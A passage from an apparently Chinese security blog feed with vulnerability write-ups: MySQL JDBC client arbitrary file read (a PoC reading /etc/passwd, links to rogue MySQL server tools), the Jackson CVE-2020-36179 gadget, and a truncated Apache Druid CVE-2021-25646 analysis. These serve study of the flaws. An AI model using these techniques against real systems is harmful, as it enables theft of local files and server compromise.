    <content type="html"><![CDATA[<p>之前Get了h2 initsql的骚姿势，于是想总结总结jdbc url可控情况下的利用方法，经典的场景就是jdbc mysql 文件读取和反序列化，正好前不久的Druid CVE-2021-26919的用的就是jdbc mysql反序列化漏洞，学习学习，居然踩一些坑，单独记录下来。</p><p>mysql client任意文件读取漏洞历史悠久，参考【6】中有提到早在13年就有提出，但是作为mysql 正常功能一直保留。直到19年blackhat 张杨和可奕 大佬发现反序列化的利用场景（参考【5】），相关研究达到小高潮，不过多赘述。</p><h2 id="MySQL-Client文件读取漏洞"><a href="#MySQL-Client文件读取漏洞" class="headerlink" title="MySQL Client文件读取漏洞"></a>MySQL Client文件读取漏洞</h2><h3 id="原理：load-local-data"><a href="#原理：load-local-data" class="headerlink" title="原理：load local data"></a>原理：load local data</h3><p>正常的load local data流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client：申请跑个sql，内容是&quot;load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;&quot;</span><br><span class="line">server：好的，（识别sql内容），那你把&#x2F;etc&#x2F;passwd文件读取传过来吧</span><br><span class="line">client：好的，（读取本地&#x2F;etc&#x2F;passwd），这是文件内容，请查收</span><br></pre></td></tr></table></figure><p>攻击流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client：申请跑个sql，内容是&quot;***&quot;（jdbc-mysql-connector默认认证登录完成之后，会有show variables&#x2F;select 参数等行为）</span><br><span class="line">server：好的，（不管sql内容），那你把&#x2F;etc&#x2F;passwd文件读取传过来吧</span><br><span class="line">client：好的，（读取本地&#x2F;etc&#x2F;passwd），这是文件内容，请查收</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="local-infile-amp-allowLoadLocalInfile"><a href="#local-infile-amp-allowLoadLocalInfile" class="headerlink" title="local-infile &amp; allowLoadLocalInfile"></a>local-infile &amp; allowLoadLocalInfile</h3><h4 id="local-infile"><a href="#local-infile" class="headerlink" title="local-infile"></a>local-infile</h4><p>mysql server 有个配置参数，在my.cnf中对应的是</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>也可以在sql中通过全局参数local_infile实现</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> local_infile = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p><strong>* 但是这并没有什么卵用 *</strong></p><p>需要关注的是mysql-client的参数，可以通过配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>或者在msyql命令行，显式加上 –local-infile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql --local-infile 1 -hlocalhost -uroot -ppassword</span><br></pre></td></tr></table></figure><h4 id="allowLoadLocalInfile"><a href="#allowLoadLocalInfile" class="headerlink" title="allowLoadLocalInfile"></a>allowLoadLocalInfile</h4><p>在jdbc-mysql-connector sdk中，控制client是否可以load local file的就是这个参数，在5.x和8.x中默认都是false（参考【7】和【8】），所以需要在jdbc url中配置allowLoadLocalInfile=true</p><p>在8.0.22中还引入了allowLoadLocalInfileInPath，不过没什么影响</p><p><img src="/images/pasted-121.png" alt="upload successful"></p><h3 id="max-allowed-packet"><a href="#max-allowed-packet" class="headerlink" title="max_allowed_packet"></a>max_allowed_packet</h3><blockquote><p>参考【1】中提到 jdbc-mysql-connector 5.x版本中，遇到max_allowed_packet 的问题，最终排查发现是client sdk中的maxAllowedPacket参数，需要server端下发配置。<br>作者采取的action是回复了client 的show varialbes请求，并在其中设置相关maxAllowedPacket等参数。</p></blockquote><p>其实在5.x中，maxAllowPacket default -1<br><img src="/images/pasted-122.png" alt="upload successful"><br>在8.*中，maxAllowPacket default 65535<br><img src="/images/pasted-123.png" alt="upload successful"></p><p>所以这也是jdbc-mysql-connector 5.*版本中需要注意的一个问题，需要显式的在url中加入参数maxAllowedPacket=65535.</p><h3 id="poc构造流程"><a href="#poc构造流程" class="headerlink" title="poc构造流程"></a>poc构造流程</h3><p>前文 load local data流程中，重点是第二个，也就是server的回包，需要指定client去读取特定文件，在不是很了解mysql协议情况下，改改包最简单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 8.*</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=65535&quot;</span>;</span><br><span class="line">Connection conn = DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;load data local infile \&quot;/etc/passwd\&quot; into table test FIELDS TERMINATED BY &#x27;\\n&#x27;;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-124.png" alt="upload successful"></p><p>server 的整个攻击步骤如下:</p><ol><li>回复mysql client一个greeting包</li><li>等待client端发送一个查询包</li><li>回复一个file transfer包</li></ol><p>这里直接给通用的利用工具</p><ol><li><p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p><p> 最早的利用工具，三个步骤，通过mysql组包实现。但是没复现成功…估计是mysql协议那里组包有问题，偷懒不详细分析了</p></li><li><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p> fnmsd的，要多看他写的文档，通过username指定读取的文件</p></li><li><p><a href="https://github.com/yang8e/jdbc_mysql_redfile">https://github.com/yang8e/jdbc_mysql_redfile</a></p><p> yang8e的，直接发包，没关注mysql协议细节，粗暴但是也简单。当时也踩了他这个坑，不过有更通用的jdbc poc url。</p></li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本以为一篇文章可以搞定，结果行文还是过长，反序列化的下篇再做研究吧。</p><p>简单总结下，本文研究了jdbc-mysql-connector的mysql client任意文件读取漏洞，结论是无论是5.*、8.*都受影响。期间踩了jdbc 5.*版本maxAllowedPacket的坑，发现了yang8e的解决方案，并提出更通用的poc。</p><p>抛出个问题:</p><ol><li>如何禁用jdbc client的load local file功能？阉割sdk？还是allowLoadLocalInfile=false</li><li>目前的poc只能读取一个文件client就会抛异常，有办法可以持续读取多个文件吗？</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.freebuf.com/articles/web/251626.html">JDBC MySQL任意文件读取中的一些坑（yangxiaocheng ）</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析（fnmsd@360）</a></li><li>[3] <a href="https://paper.seebug.org/1227/">MySQL JDBC 客户端反序列化漏洞（四哥）</a></li><li>[4] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC 反序列化分析（7tem7）</a></li><li>[5] <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">《New Exploit Technique In Java Deserialization Attack》(zhangyang &amp; keyi大佬)</a></li><li>[6] <a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></li><li>[7] <a href="https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html</a></li><li>[8] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html</a></li><li>[9] <a href="http://scz.617.cn:8/network/202001101612.txt">恶意MySQL Server读取MySQL Client端文件（四哥）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前Get了h2 initsql的骚姿势，于是想总结总结jdbc url可控情况下的利用方法，经典的场景就是jdbc mysql 文件读取和反序列化，正好前不久的Druid CVE-2021-26919的用的就是jdbc mysql反序列化漏洞，学习学习，居然踩一些坑，单独记录下来。&lt;/p&gt;
&lt;p&gt;mysql client任意文件读取漏洞历史悠久，参考【6】中有提到早在13年就有提出，但是作为mysql 正常功能一直保留。直到19年blackhat 张杨和可奕 大佬发现反序列化的利用场景（参考【5】），相关研究达到小高潮，不过多赘述。&lt;/p&gt;
&lt;h2 id=&quot;MySQL-Client文件读取漏洞&quot;&gt;&lt;a href=&quot;#MySQL-Client文件读取漏洞&quot; class=&quot;headerlink&quot; title=&quot;MySQL Client文件读取漏洞&quot;&gt;&lt;/a&gt;MySQL Client文件读取漏洞&lt;/h2&gt;&lt;h3 id=&quot;原理：load-local-data&quot;&gt;&lt;a href=&quot;#原理：load-local-data&quot; class=&quot;headerlink&quot; title=&quot;原理：load local data&quot;&gt;&lt;/a&gt;原理：load local data&lt;/h3&gt;&lt;p&gt;正常的load local data流程&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;client：申请跑个sql，内容是&amp;quot;load data local infile &amp;quot;&amp;#x2F;etc&amp;#x2F;passwd&amp;quot; into table test FIELDS TERMINATED BY &amp;#39;\n&amp;#39;;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server：好的，（识别sql内容），那你把&amp;#x2F;etc&amp;#x2F;passwd文件读取传过来吧&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;client：好的，（读取本地&amp;#x2F;etc&amp;#x2F;passwd），这是文件内容，请查收&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;攻击流程&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;client：申请跑个sql，内容是&amp;quot;***&amp;quot;（jdbc-mysql-connector默认认证登录完成之后，会有show variables&amp;#x2F;select 参数等行为）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server：好的，（不管sql内容），那你把&amp;#x2F;etc&amp;#x2F;passwd文件读取传过来吧&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;client：好的，（读取本地&amp;#x2F;etc&amp;#x2F;passwd），这是文件内容，请查收&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>JackSon DriverAdapterCPDS gadget CVE-2020-36179分析</title>
    <link href="http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/</id>
    <published>2021-04-09T04:30:00.000Z</published>
    <updated>2021-04-19T07:25:35.513Z</updated>
    
    <content type="html"><![CDATA[<p>Day1发现有分析 jackson 的DriverAdapterCPDS 这个gadget</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>其实是参考【1】大佬上报的CVE-2020-36179</p><p>Gadget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DriverAdapterCPDS</span><br><span class="line">    -&gt;seturl</span><br><span class="line">        -&gt;getPooledConnection</span><br><span class="line">            -&gt;DirverManager.getConnection(this.url,username,pass)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>gadget流程很简单，但是在复现的时候发现卡在getParentLogger这里，不会执行到getPooledConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SQLFeatureNotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见getParentLogger简单粗暴直接throw Exception，直接GG</p><p>多次测试发现getParentLogger，getPooledConnection执行顺序并不是有序的，如下：</p><p>失败<br><img src="/images/pasted-120.png" alt="upload successful"></p><p>成功<br><img src="/images/pasted-119.png" alt="upload successful"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>背景知识：jackson反序列化会执行部分getter</p><p>getter的产生流程跟踪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">_addMemberMethods:110, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collect:42, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectMethods:33, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_methods:365, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">memberMethods:305, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_addMethods:525, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectAll:309, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getPropertyMap:287, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getProperties:170, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_properties:164, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findProperties:239, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_findCreatorsFromProperties:361, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_constructDefaultValueInstantiator:345, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueInstantiator:269, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">buildBeanDeserializer:214, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">createBeanDeserializer:137, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer2:411, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer:349, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCache2:264, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCacheValueDeserializer:244, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueDeserializer:142, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findContextualValueDeserializer:444, DeserializationContext (com.fasterxml.jackson.databind)</span><br><span class="line">_findDeserializer:194, TypeDeserializerBase (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">_deserialize:97, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:71, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:712, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:68, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:4014, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:3005, ObjectMapper (com.fasterxml.jackson.databind)</span><br></pre></td></tr></table></figure><blockquote><p>最终观察发现jackson通过 ClassUtil.getClassMethods(cls)获取所有的函数，最终调用的是getDeclaredMethods()，而getDeclaredMethods()返回数组中的元素没有排序，也没有任何特定的顺序，从而导致随机触发。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>简单跟踪分析了CVE-2020-36179 这个链，发现2处有意思的点</p><ol><li>jdbc url 可控情况下，利用H2 sql可攻击h2 server（）</li><li>getDeclaredMethods 随机特性</li></ol><p>拓展思考</p><ol><li>jdbc url可控是个通用问题</li><li>getDeclaredMethods 随机特性有绕过方法吗？</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[2] <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">H2 feature</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Day1发现有分析 jackson 的DriverAdapterCPDS 这个gadget&lt;/p&gt;
&lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;p&gt;其实是参考【1】大佬上报的CVE-2020-36179&lt;/p&gt;
&lt;p&gt;Gadget:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;DriverAdapterCPDS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt;seturl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        -&amp;gt;getPooledConnection&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            -&amp;gt;DirverManager.getConnection(this.url,username,pass)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Jackson" scheme="http://m0d9.me/tags/Jackson/"/>
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-25646 漏洞分析</title>
    <link href="http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/</id>
    <published>2021-02-19T03:16:00.000Z</published>
    <updated>2021-04-24T05:56:58.714Z</updated>
    
    <content type="html"><![CDATA[<p>Litch1大佬的这个洞有意思，终于有时间分析下，记录下分析过程</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://archive.apache.org/dist/druid/">https://archive.apache.org/dist/druid/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wget</span> https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;&amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz</span><br></pre></td></tr></table></figure><p>根据参考，修改conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.config，末尾增加调试参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Jackson注解"><a href="#Jackson注解" class="headerlink" title="Jackson注解"></a>Jackson注解</h3><h4 id="name为空字符串的CreatorProperty"><a href="#name为空字符串的CreatorProperty" class="headerlink" title="name为空字符串的CreatorProperty"></a>name为空字符串的CreatorProperty</h4><p>作者给出这个漏洞的关键点解释</p><blockquote><p>漏洞的关键：<br>在于对用JsonCreator注解修饰的方法来说，方法的所有参数都会解析成CreatorProperty类型，对于没有使用JsonProperty注解修饰的参数来说,会创建一个name为””的CreatorProperty，在用户传入键为””的json对象时就会被解析到对应的参数上。</p></blockquote><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>其中与该漏洞相关的注解如下</p><ul><li>JsonCreator</li><li>JsonProperty</li><li>JacksonInject</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JavaScriptConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonCreator</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person4</span><span class="params">(<span class="meta">@JsonProperty(&quot;age&quot;)</span> <span class="keyword">int</span> age,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JsonProperty(&quot;name&quot;)</span> String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JacksonInject</span> JavaScriptConfig config)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.config = config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User [name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;, config=&quot;</span> + config.toString() + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String sp4 = <span class="string">&quot;&#123;\&quot;enabled\&quot;:true&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper4 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            JavaScriptConfig pp4 = mapper4.readValue(sp4, JavaScriptConfig.class);</span><br><span class="line">            System.out.println(pp4);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;---------------------------&quot;</span>);</span><br><span class="line">            String sp5 = <span class="string">&quot;&#123;\&quot;age\&quot;:10,\&quot;name\&quot;:\&quot;m0d9\&quot;,\&quot;\&quot;:&#123;\&quot;enabled\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper5 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            Person4 pp5 = mapper5.readValue(sp5, Person4.class);</span><br><span class="line">            System.out.println(pp5);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>output 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JavaScriptConfig&#123;enabled&#x3D;true&#125;</span><br><span class="line">---------------------------</span><br><span class="line">User [name&#x3D;m0d9, age&#x3D;10, config&#x3D;JavaScriptConfig&#123;enabled&#x3D;true&#125;]</span><br></pre></td></tr></table></figure><h4 id="Jackson反序列化流程跟踪"><a href="#Jackson反序列化流程跟踪" class="headerlink" title="Jackson反序列化流程跟踪"></a>Jackson反序列化流程跟踪</h4><p>的确如Litch1所言，key为””的value({“enabled”:true})被jackson反序列化之后赋值给config。为何如此？跟踪下Jackson JsonCreator的逻辑</p><p>作者也有给出对应的关键过程</p><blockquote><p>com.fasterxml.jackson.databind.deser.BeanDeserializer#_deserializeUsingPropertyBased在解析的过程中，会拿解析到的json串中的“键名”去查找当前解析对象中对应的creatorProperty，这步对应的是findCreatorProperty方法，findCreatorProperty方法会去_propertyLookup 这个HashMap中查找”键名”对应的属性，在_propertyLookup中可以看到其中没有用JsonProperty注释修饰的JavaScriptConfig的键为””，要是json串中的键也为””，就能匹配上，取出JavaScriptConfig对应的creatorProperty</p></blockquote><p>简单而言，Jackson反序列化过程基本如下</p><ol><li>调用mapper.readValue(jsonString, DstClass.class)</li><li>分析DstClass，有哪些属性Property，以及这些属性对应的set方法(creatorProperty)是什么</li><li>依次读取jsonString key &amp; value，根据步骤2中key对应的set方法，调用并创建。</li></ol><p>其中，分析DstClass，在com.fasterxml.jackson.databind.deser.BeanDeserializer这个类中实现，步骤2中的结果保存在BeanDeserializer#_beanProperties Map类里面，之后通过PropertyBeanCreator转换为BeanDeserializer#_propertyLookup</p><p><img src="/images/pasted-117.png" alt="upload successful"></p><p><img src="/images/pasted-118.png" alt="upload successful"></p><p><strong>可见config对应的CreatorProperty 